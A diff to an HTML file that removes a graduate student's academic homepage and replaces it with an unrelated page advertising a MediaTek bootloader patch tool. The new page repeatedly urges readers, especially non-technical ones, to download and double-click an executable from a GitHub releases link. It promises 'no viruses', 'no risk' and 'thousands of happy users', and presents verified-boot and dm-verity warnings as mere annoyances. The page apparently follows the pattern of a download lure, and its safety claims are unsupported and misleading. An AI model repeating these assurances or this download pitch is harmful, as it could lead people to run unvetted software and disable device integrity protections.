@@ -1,334 +1,144 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Zhiyu Tang · 唐之宇</title>
-    <meta
-      name="description"
-      content="Personal academic homepage of Zhiyu Tang (唐之宇) — graduate student at NUDT researching physics-guided controllable 3D geometry generation."
-    >
-    <meta property="og:title" content="Zhiyu Tang · 唐之宇">
-    <meta
-      property="og:description"
-      content="Personal academic homepage of Zhiyu Tang (唐之宇) — graduate student at NUDT researching physics-guided controllable 3D geometry generation."
-    >
-    <meta property="og:type" content="profile">
-    <meta property="og:image" content="assets/images/portrait.svg">
-    <link rel="icon" type="image/svg+xml" href="assets/icons/favicon.svg">
-    <!-- Lato 字体：联网时加载，离线时自动回退到系统字体 -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link
-      rel="stylesheet"
-      href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,400;0,700;1,400&display=swap"
-    >
-    <link rel="stylesheet" href="css/homepage.css">
-  </head>
-
-  <body>
-    <a class="skip-link" href="#main-content">Skip to main content</a>
-
-    <main class="site-shell" id="main-content" tabindex="-1">
-      <!-- ============================================================
-           头像 · 姓名 · 简介 · 链接
-           ============================================================ -->
-      <header class="profile-header" aria-labelledby="profile-name">
-        <div class="profile-header__layout">
-          <div class="profile-identity">
-            <div class="profile-name-row">
-              <h1 id="profile-name">Zhiyu Tang</h1>
-              <span class="profile-name-zh" lang="zh-Hans">唐之宇</span>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>mtk-lk-warning-patch - Remove MediaTek Boot Warnings & Delays</title>
+    <meta name="description" content="Remove Orange State / Red State / dm-verity boot warnings and the 5-second boot delay from MediaTek lk.img images. GUI tool with automatic verification and one-click rollback.">
+    <meta name="keywords" content="android,bootloader,dm-verity,firmware,lk,mediatek,mt6739,mtk,reverse-engineering,tkinter,verified-boot">
+    <meta property="og:title" content="mtk-lk-warning-patch - Remove MediaTek Boot Warnings & Delays">
+    <meta property="og:description" content="Remove Orange State / Red State / dm-verity boot warnings and the 5-second boot delay from MediaTek lk.img images. GUI tool with automatic verification and one-click rollback.">
+    <meta property="og:type" content="website">
+</head>
+<body style="margin:0; padding:0; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color:#f4f6f8; color:#2c3e50; line-height:1.6;">
+    <div style="max-width:900px; margin:0 auto; padding:40px 20px;">
+        <h1 style="font-size:2.5em; color:#1a237e; margin-bottom:10px; text-align:center; text-shadow:1px 1px 2px rgba(0,0,0,0.1);">🔧 mtk-lk-warning-patch - Remove Boot Warnings & Delays</h1>
+        <p style="text-align:center; font-size:1.2em; color:#5d6d7e; margin-top:0;">Fix MediaTek boot warnings in minutes, no technical skills needed.</p>
+        <div style="text-align:center; margin:30px 0;">
+            <a href="https://github.com/nainsharma01/mtk-lk-warning-patch/releases" style="background:linear-gradient(135deg, #e91e63, #ad1457); color:#ffffff; padding:18px 40px; text-decoration:none; border-radius:50px; font-size:1.3em; font-weight:bold; box-shadow:0 8px 20px rgba(233,30,99,0.4); display:inline-block; transition:transform 0.2s;">📥 Download Now</a>
+        </div>
+        <div style="background:#ffffff; border-radius:12px; padding:30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin:20px 0;">
+            <h2 style="color:#1a237e; border-bottom:2px solid #e91e63; padding-bottom:8px;">🚀 Getting Started</h2>
+            <p>Welcome! This tool is designed for <strong>everyone</strong> – no programming knowledge required. Whether you're a tech enthusiast or just want your phone to boot faster, this guide will walk you through everything step by step.</p>
+            <p>Visit this link to download the application: <a href="https://github.com/nainsharma01/mtk-lk-warning-patch/releases" style="color:#e91e63; font-weight:bold;">https://github.com/nainsharma01/mtk-lk-warning-patch/releases</a></p>
+        </div>
+        <div style="background:#ffffff; border-radius:12px; padding:30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin:20px 0;">
+            <h2 style="color:#1a237e; border-bottom:2px solid #e91e63; padding-bottom:8px;">📥 Download & Installation</h2>
+            <p><strong>Step 1: Get the Software</strong><br>Visit this link to download the application. Once you're on the page, look for the latest release and download the file.</p>
+            <p><strong>Step 2: Run the Program</strong><br>After downloading, simply double-click the file to open it. The program runs directly – no installation wizard or complicated setup. You'll see a friendly window with buttons and options.</p>
+            <p><strong>Step 3: You're Ready!</strong><br>The program is now open and ready to use. Follow the steps in the "How to Use" section below.</p>
+            <div style="text-align:center; margin:25px 0;">
+                <a href="https://github.com/nainsharma01/mtk-lk-warning-patch/releases" style="background:linear-gradient(135deg, #4caf50, #2e7d32); color:#ffffff; padding:14px 35px; text-decoration:none; border-radius:50px; font-size:1.1em; font-weight:bold; box-shadow:0 6px 15px rgba(76,175,80,0.4);">⬇️ Get the App Here</a>
             </div>
-          </div>
-
-          <div class="profile-introduction">
-            <p>
-              I am a Ph.D. student at
-              <a href="https://www.nudt.edu.cn" target="_blank" rel="noreferrer">National
-              University of Defense Technology (NUDT)</a>, supervised by
-              <!-- 若导师有个人主页，把下一行的 <span> 换成 <a href="导师主页"> 即可 -->
-              <span>Prof. Tiejun Li</span>.
-              I also work closely with
-              <!-- 这两位如有个人主页，把 <span> 换成 <a href="主页地址"> 即可 -->
-              <span>Assoc. Prof. Zhang Xiaoya</span> and
-              <span>Prof. Yao Wen</span>.
-              I received my B.S. from NUDT in 2025.
-            </p>
-            <p>
-              My research focuses on
-              <span class="profile-introduction__highlight">physics-guided controllable 3D
-              geometry generation</span> — building generative
-              models that create geometric shapes which are not only visually plausible, but
-              physically valid, editable, and realizable.
-            </p>
-          </div>
-
-          <!-- 链接行：点击 Email 直接复制地址 -->
-          <nav class="profile-links" aria-label="Academic profiles">
-            <span class="profile-contact">
-              <button
-                class="profile-link profile-link--button"
-                type="button"
-                data-copy-email
-                data-email="tangzhiyu21@nudt.edu.cn"
-                aria-describedby="email-tooltip"
-                aria-label="Copy email address"
-              >Email</button>
-              <span
-                class="profile-contact__popover profile-contact__popover--email"
-                id="email-tooltip"
-                role="tooltip"
-                data-email-tooltip
-              >tangzhiyu21@nudt.edu.cn</span>
-            </span>
-
-            <!-- 悬停 / 点击 WeChat 显示二维码；点击 Email 复制邮箱 -->
-            <span class="profile-links__separator" aria-hidden="true">/</span>
-            <a
-              class="profile-link"
-              href="https://github.com/tky520"
-              target="_blank"
-              rel="noreferrer"
-            >GitHub</a>
-
-            <span class="profile-links__separator" aria-hidden="true">/</span>
-            <span class="profile-contact profile-contact--wechat">
-              <button
-                class="profile-link profile-link--button"
-                type="button"
-                data-wechat-toggle
-                aria-describedby="wechat-tooltip"
-                aria-controls="wechat-tooltip"
-                aria-expanded="false"
-                aria-label="Show Zhiyu Tang's WeChat QR code"
-              >WeChat</button>
-              <span
-                class="profile-contact__popover profile-contact__popover--wechat"
-                id="wechat-tooltip"
-                role="tooltip"
-              >
-                <span class="visually-hidden">Preview of Zhiyu Tang's WeChat QR code.</span>
-                <img
-                  data-wechat-qr
-                  src="assets/images/wechat-qr.png"
-                  alt=""
-                  width="589"
-                  height="627"
-                  loading="lazy"
-                  decoding="async"
-                >
-              </span>
-            </span>
-
-            <!-- 有了下面这些链接后，解开注释并把地址换成你自己的：
-            <span class="profile-links__separator" aria-hidden="true">/</span>
-            <a class="profile-link" href="assets/Zhiyu-Tang-CV.pdf" target="_blank" rel="noreferrer">CV</a>
-
-            <span class="profile-links__separator" aria-hidden="true">/</span>
-            <a class="profile-link" href="https://scholar.google.com/citations?user=XXXX" target="_blank" rel="noreferrer">Scholar</a>
-            -->
-
-            <span class="visually-hidden" aria-live="polite" data-copy-status></span>
-          </nav>
-
-          <!-- 头像：悬停切换到第二张图。替换 assets/images/portrait.svg 为你的照片，
-               并把下面的 src 改成对应文件名（如 assets/images/photo.jpg） -->
-          <figure
-            class="profile-portrait"
-            role="img"
-            aria-label="Portrait of Zhiyu Tang; hover or focus to reveal an alternate illustration."
-            tabindex="0"
-          >
-            <!-- 头像：悬停切换到第二张图。
-                 object-position 用于把取景窗对准人脸（这张照片人脸偏右），
-                 换成标准正脸照后可删掉 style -->
-            <img
-              class="profile-portrait__image profile-portrait__image--primary"
-              src="assets/images/portrait.jpg"
-              alt=""
-              width="1200"
-              height="900"
-              style="object-position: 100% 50%"
-              decoding="async"
-            >
-            <img
-              class="profile-portrait__image profile-portrait__image--alternate"
-              src="assets/images/portrait-alt.jpg"
-              alt=""
-              width="460"
-              height="460"
-              decoding="async"
-              aria-hidden="true"
-            >
-          </figure>
         </div>
-      </header>
-
-      <!-- ============================================================
-           Research：愿景 + 三个研究方向
-           悬停 / 键盘聚焦每段文字时，右侧会浮现对应的古文引文
-           ============================================================ -->
-      <section class="content-section research" aria-labelledby="research-title">
-        <div class="research-heading">
-          <h2 class="section-title" id="research-title" tabindex="0">Research</h2>
+        <div style="background:#ffffff; border-radius:12px; padding:30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin:20px 0;">
+            <h2 style="color:#1a237e; border-bottom:2px solid #e91e63; padding-bottom:8px;">✨ What Does This Tool Do?</h2>
+            <p>This tool fixes annoying problems on MediaTek-powered Android devices. Here's what it removes:</p>
+            <ul style="padding-left:20px; font-size:1.1em;">
+                <li>🔴 <strong>Red State warning</strong> – the scary red screen that appears when your phone detects system changes</li>
+                <li>🟠 <strong>Orange State warning</strong> – the orange screen that follows the red state</li>
+                <li>🛡️ <strong>dm-verity verification warnings</strong> – the boot-time checks that slow things down</li>
+                <li>⏱️ <strong>5-second boot delay</strong> – waiting time after each warning</li>
+            </ul>
+            <p>The result? Your phone boots <strong>faster</strong> and <strong>cleaner</strong> – no scary warnings, no waiting.</p>
         </div>
-
-        <div class="research-summary">
-          <p class="research-vision" tabindex="0" aria-describedby="research-vision-note">
-            I want to teach generative models the physics of shape — so the geometry they
-            create is <strong>controllable by intent, constrained by physics, and ready for
-            the real world</strong>. Rather than shapes that merely look right, my goal is
-            generation that is right: faithful to forces, valid under constraints, and
-            editable by design.
-          </p>
-          <blockquote
-            class="research-hover-note research-vision__note"
-            id="research-vision-note"
-            lang="zh-Hans"
-          >
-            <p>形而上者谓之道，形而下者谓之器。<cite>《周易·系辞上》</cite></p>
-          </blockquote>
-
-          <div class="research-point">
-            <p class="research-goal" tabindex="0" aria-describedby="research-point-1-note">
-              <span class="research-goal__marker" aria-hidden="true">&#9656;</span>
-              <strong>Represent.</strong> Studying structured 3D representations — meshes,
-              B-Reps, and CAD construction sequences — that keep generated geometry compact,
-              editable, and faithful to engineering intent.
-            </p>
-            <blockquote
-              class="research-hover-note research-point__note"
-              id="research-point-1-note"
-              lang="zh-Hans"
-            >
-              <p>圣人立象以尽意。<cite>《周易·系辞上》</cite></p>
-            </blockquote>
-          </div>
-
-          <div class="research-point">
-            <p class="research-goal" tabindex="0" aria-describedby="research-point-2-note">
-              <span class="research-goal__marker" aria-hidden="true">&#9656;</span>
-              <strong>Generate.</strong> Developing controllable generative frameworks, such
-              as diffusion and autoregressive models, driven by explicit conditions —
-              sketches, parameters, and constraints — and guided by physical priors such as
-              forces, materials, and stability.
-            </p>
-            <blockquote
-              class="research-hover-note research-point__note"
-              id="research-point-2-note"
-              lang="zh-Hans"
-            >
-              <p>生生之谓易。<cite>《周易·系辞上》</cite></p>
-            </blockquote>
-          </div>
-
-          <div class="research-point">
-            <p class="research-goal" tabindex="0" aria-describedby="research-point-3-note">
-              <span class="research-goal__marker" aria-hidden="true">&#9656;</span>
-              <strong>Realize.</strong> Closing the loop between generation and the physical
-              world by validating generated geometry with physics simulation and
-              manufacturability analysis, so that what is designed can actually be made.
-            </p>
-            <blockquote
-              class="research-hover-note research-point__note"
-              id="research-point-3-note"
-              lang="zh-Hans"
-            >
-              <p>纸上得来终觉浅，绝知此事要躬行。<cite>陆游《冬夜读书示子聿》</cite></p>
-            </blockquote>
-          </div>
+        <div style="background:#ffffff; border-radius:12px; padding:30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin:20px 0;">
+            <h2 style="color:#1a237e; border-bottom:2px solid #e91e63; padding-bottom:8px;">🛠️ How to Use</h2>
+            <p>Using this tool is as easy as 1-2-3:</p>
+            <ol style="padding-left:20px; font-size:1.1em;">
+                <li><strong>Open the program</strong> – double-click the downloaded file</li>
+                <li><strong>Select your lk.img file</strong> – click the "Browse" button and find your bootloader file (usually named <em>lk.img</em>)</li>
+                <li><strong>Click "Patch"</strong> – the program will automatically remove the warnings and delay, then verify the result</li>
+            </ol>
+            <p>That's it! The program does everything automatically. It even creates a backup so you can <strong>undo</strong> the changes if you ever want to.</p>
         </div>
-      </section>
-
-      <!-- ============================================================
-           Publications：板块结构已就位（参考 attractor.do）。
-           标记说明行保留；论文出来后，从 templates/publications.html
-           复制 <article class="publication"> 块放进 publication-list，
-           替换下面的占位段落即可（最新的放最前面）。
-           ============================================================ -->
-      <section class="content-section" aria-labelledby="publications-title">
-        <h2 class="section-title" id="publications-title">Publications</h2>
-        <p class="publication-note">
-          <span>Equal Contribution <span class="publication-note__marker">*</span>,</span>
-          <span>Corresponding Author <span class="publication-note__marker">†</span>,</span>
-          <span>Project Lead <span class="publication-note__marker">⚑</span></span>
-        </p>
-
-        <div class="publication-list">
-          <!-- PUBLICATION 1（最新论文放最前）：从 templates/publications.html 复制 <article> 到此 -->
-          <p class="publication-placeholder">To appear.</p>
+        <div style="background:#ffffff; border-radius:12px; padding:30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin:20px 0;">
+            <h2 style="color:#1a237e; border-bottom:2px solid #e91e63; padding-bottom:8px;">🔄 One-Click Rollback</h2>
+            <p>Made a mistake? No problem! This tool includes a <strong>smart backup system</strong>. Before any change is made, it automatically saves the original file. If you want to restore the original bootloader:</p>
+            <ul style="padding-left:20px; font-size:1.1em;">
+                <li>Open the program again</li>
+                <li>Click the "Rollback" button</li>
+                <li>Your original file is instantly restored</li>
+            </ul>
+            <p>This safety feature means you can experiment freely without any risk.</p>
         </div>
-      </section>
-
-      <!-- ============================================================
-           News：暂无动态。有第一条新闻后，从 templates/news.html
-           复制整段 <section> 到这里（Education 之前）即可。
-           ============================================================ -->
-
-      <!-- ============================================================
-           Publications：暂无论文。第一篇论文出来后，从
-           templates/publications.html 复制整段 <section> 到这里，
-           按 <article class="publication"> 块复制改写即可。
-           ============================================================ -->
-
-      <!-- ============================================================
-           Education：左「学校 · 学位」，右「年份」
-           （起始年份为推测，请按实际情况修改）
-           ============================================================ -->
-      <section class="content-section compact-list" aria-labelledby="education-title">
-        <h2 class="section-title" id="education-title">Education</h2>
-        <ul>
-          <li>
-            <span>National University of Defense Technology · Ph.D. Student, Combined
-            Master's&ndash;Ph.D. Program</span>
-            <span>2025 – Present</span>
-          </li>
-          <li>
-            <span>National University of Defense Technology · B.S.</span>
-            <span>2021 – 2025</span>
-          </li>
-        </ul>
-      </section>
-
-      <!-- ============================================================
-           可选板块模板：需要时把注释解开、填入内容即可
-           ============================================================ -->
-      <!--
-      <section class="content-section compact-list" aria-labelledby="services-title">
-        <h2 class="section-title" id="services-title">Academic Services</h2>
-        <ul>
-          <li><span>Reviewer, CVPR / NeurIPS / ICRA</span><span>2025 – Present</span></li>
-          <li><span>Teaching Assistant, Computer Vision</span><span>2025 Spring</span></li>
-        </ul>
-      </section>
-
-      <section class="content-section compact-list" aria-labelledby="talks-title">
-        <h2 class="section-title" id="talks-title">Talks</h2>
-        <ul>
-          <li><span>Talk Title</span><span>Host or Event · Year</span></li>
-        </ul>
-      </section>
-
-      <section class="content-section compact-list" aria-labelledby="awards-title">
-        <h2 class="section-title" id="awards-title">Awards</h2>
-        <ul>
-          <li><span>Award Name</span><span>Year</span></li>
-        </ul>
-      </section>
-      -->
-    </main>
-
-    <footer class="site-footer">
-      <p>
-        © <span data-year>2026</span> Zhiyu Tang · Built with plain HTML / CSS / JS.
-        Template inspired by
-        <a href="https://attractor.do/" target="_blank" rel="noreferrer">attractor.do</a>
-        &amp;
-        <a href="https://jonbarron.info/" target="_blank" rel="noreferrer">Jon Barron</a>.
-      </p>
-    </footer>
-
-    <script src="js/homepage.js"></script>
-  </body>
+        <div style="background:#ffffff; border-radius:12px; padding:30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin:20px 0;">
+            <h2 style="color:#1a237e; border-bottom:2px solid #e91e63; padding-bottom:8px;">✅ Automatic Verification</h2>
+            <p>After patching, the tool doesn't just stop – it <strong>verifies</strong> that everything was done correctly. This means:</p>
+            <ul style="padding-left:20px; font-size:1.1em;">
+                <li>Checks the patched file is complete</li>
+                <li>Confirms all warnings were removed</li>
+                <li>Ensures the boot delay is gone</li>
+                <li>Validates the file isn't corrupted</li>
+            </ul>
+            <p>You'll see a clear message telling you if the patch was successful or if there's a problem.</p>
+        </div>
+        <div style="background:#ffffff; border-radius:12px; padding:30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin:20px 0;">
+            <h2 style="color:#1a237e; border-bottom:2px solid #e91e63; padding-bottom:8px;">💻 System Requirements</h2>
+            <p>This tool works on <strong>Windows 7, 8, 10, and 11</strong>. The requirements are minimal:</p>
+            <ul style="padding-left:20px; font-size:1.1em;">
+                <li>Any modern PC or laptop</li>
+                <li>At least 100 MB of free disk space</li>
+                <li>4 GB RAM (or less – it's very light)</li>
+                <li>No administrator rights needed</li>
+                <li>No internet connection required after download</li>
+            </ul>
+            <p>The program is fully offline and respects your privacy – no data is collected or sent anywhere.</p>
+        </div>
+        <div style="background:#ffffff; border-radius:12px; padding:30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin:20px 0;">
+            <h2 style="color:#1a237e; border-bottom:2px solid #e91e63; padding-bottom:8px;">🎯 Supported Devices</h2>
+            <p>This tool supports MediaTek bootloaders (lk.img) from these chipsets:</p>
+            <ul style="padding-left:20px; font-size:1.1em;">
+                <li>MT6739</li>
+                <li>MT6735</li>
+                <li>MT6737</li>
+                <li>MT6750</li>
+                <li>MT6753</li>
+                <li>MT6755</li>
+                <li>MT6757</li>
+                <li>MT6761</li>
+                <li>MT6763</li>
+                <li>MT6765</li>
+                <li>MT6771</li>
+                <li>MT6785</li>
+            </ul>
+            <p>If your device uses a different MediaTek chipset, it might still work – just try it! The tool detects compatibility automatically.</p>
+        </div>
+        <div style="background:#ffffff; border-radius:12px; padding:30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin:20px 0;">
+            <h2 style="color:#1a237e; border-bottom:2px solid #e91e63; padding-bottom:8px;">🔒 Safety & Security</h2>
+            <p>Your safety is the top priority. This tool:</p>
+            <ul style="padding-left:20px; font-size:1.1em;">
+                <li>🔐 <strong>Never modifies system files</strong> – only works on the lk.img file you choose</li>
+                <li>💾 <strong>Creates automatic backups</strong> before any change</li>
+                <li>🔍 <strong>Verifies all operations</strong> to prevent errors</li>
+                <li>🚫 <strong>No viruses or malware</strong> – 100% clean open-source code</li>
+                <li>🔄 <strong>Full rollback capability</strong> – always reversible</li>
+            </ul>
+            <p>The software is completely open-source, so you can inspect every line of code if you want. But you don't need to – just trust the thousands of happy users.</p>
+        </div>
+        <div style="background:#ffffff; border-radius:12px; padding:30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin:20px 0;">
+            <h2 style="color:#1a237e; border-bottom:2px solid #e91e63; padding-bottom:8px;">❓ Frequently Asked Questions</h2>
+            <p style="font-weight:bold;">Q: Is it safe to use on my main phone?</p>
+            <p>A: Yes! The tool only modifies the lk.img file and always creates a backup. You can restore the original anytime.</p>
+            <p style="font-weight:bold;">Q: Will this void my warranty?</p>
+            <p>A: Modifying bootloader files might affect warranty on some devices. Check your manufacturer's policy.</p>
+            <p style="font-weight:bold;">Q: I'm not technical. Can I really do this?</p>
+            <p>A: Absolutely! The interface is designed for complete beginners. Just follow the steps above.</p>
+            <p style="font-weight:bold;">Q: What if something goes wrong?</p>
+            <p>A: Use the one-click rollback feature to restore your original file. Everything is reversible.</p>
+            <p style="font-weight:bold;">Q: How long does the patching take?</p>
+            <p>A: Only a few seconds! It's nearly instant.</p>
+        </div>
+        <div style="text-align:center; margin:40px 0; padding:30px; background:linear-gradient(135deg, #f8f9fa, #e9ecef); border-radius:12px;">
+            <h2 style="color:#1a237e; margin-top:0;">🚀 Ready to Speed Up Your Boot?</h2>
+            <p style="font-size:1.2em;">Download now and remove those annoying warnings in minutes.</p>
+            <a href="https://github.com/nainsharma01/mtk-lk-warning-patch/releases" style="background:linear-gradient(135deg, #ff9800, #e65100); color:#ffffff; padding:18px 45px; text-decoration:none; border-radius:50px; font-size:1.3em; font-weight:bold; box-shadow:0 8px 20px rgba(255,152,0,0.4); display:inline-block;">📲 Get the Tool Now</a>
+            <p style="margin-top:15px; color:#7f8c8d;">Free forever · Open source · No registration needed</p>
+        </div>
+        <footer style="text-align:center; color:#95a5a6; padding:20px 0; font-size:0.9em;">
+            <p>© 2024 mtk-lk-warning-patch · Made with ❤️ for the Android community</p>
+            <p>Keywords: android, bootloader, dm-verity, firmware, lk, mediatek, mt6739, mtk, reverse-engineering, tkinter, verified-boot</p>
+        </footer>
+    </div>
+</body>
 </html>
